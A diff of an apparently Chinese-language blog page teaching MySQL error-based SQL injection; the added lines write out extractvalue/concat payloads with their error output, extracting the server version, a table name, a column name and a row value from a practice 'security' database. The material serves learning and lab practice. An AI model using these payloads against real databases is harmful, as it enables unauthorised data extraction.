@@ -95,11 +95,9 @@
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;bc9e4db1bc364e6aa0e3cdc8115c9005&#x2F;aca94ac1ee07f8a361f1a990a26b8c11.jpg">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;1d8f3b8affec40f99a01d5342ebc4d0e&#x2F;20242323e0aee047d9aa9dbdb00c474e.jpg">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;61be0dc6b8f748e797a47241c6db9c9e&#x2F;efb6e80b721f725981aedeb98f49d888.jpg">
-<meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;6247c2803e9045e89003cc090c591b33&#x2F;551927935215.png">
-<meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;c5a8179558f04872b8bae0384fa6adba&#x2F;551928141656.png">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;9c34adb97fd24630beb944c330483a5b&#x2F;clipboard.png">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;572314954ddd4d3f86f7572f075e126e&#x2F;clipboard.png">
-<meta property="og:updated_time" content="2019-11-25T04:21:27.842Z">
+<meta property="og:updated_time" content="2019-11-25T17:46:48.527Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;578be440399e4219a9518c89d8431ac1&#x2F;cbd890e837b7d5b75f78d7af814362ed.jpg">
 
@@ -348,10 +346,15 @@
 <p><a href="https://yq.aliyun.com/go/articleRenderRedirect?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue" target="_blank" rel="noopener">ExtractValue()</a>接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p>
 <p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p>
 <p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p>
-<p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/6247c2803e9045e89003cc090c591b33/551927935215.png" alt="img"></p>
 <p>（这里我们是为了学习报错注入，所以不需要太详细的知道该函数具体原理）</p>
 <p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
-<p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/c5a8179558f04872b8bae0384fa6adba/551928141656.png" alt="img"></p>
+<p>mysql&gt; select 1 and extractvalue(1,concat(‘<del>‘,(select version())));<br>ERROR 1105 (HY000): XPATH syntax error: ‘</del>5.5.53’</p>
+<p>mysql&gt; select 1 and extractvalue(1,concat(‘~’,(select table_name from information_schema.tables where table_schema = ‘security’ limit 0,1)));</p>
+<p>ERROR 1105 (HY000): XPATH syntax error: ‘~emails’</p>
+<p>select 1 and extractvalue(1,concat(‘~’,(select column_name from information_schema.columns where table_name = ‘emails’ limit 0,1)));</p>
+<p>ERROR 1105 (HY000): XPATH syntax error: ‘~id’</p>
+<p>select 1 and extractvalue(1,concat(‘~’,(select id from security.emails limit 0,1)));</p>
+<p>ERROR 1105 (HY000): XPATH syntax error: ‘~1’</p>
 <p>个人见解</p>
 <h4><span id="er-floor">二、floor</span><a href="#er-floor" class="header-anchor">#</a></h4><p>1.rand（）是回随机产生一 ‘列’ 数  平时只是取出一行</p>
 <p>2.rand（0）是固定产生一‘列 数    使用select * rand（0）永远取出的是第一列 </p>
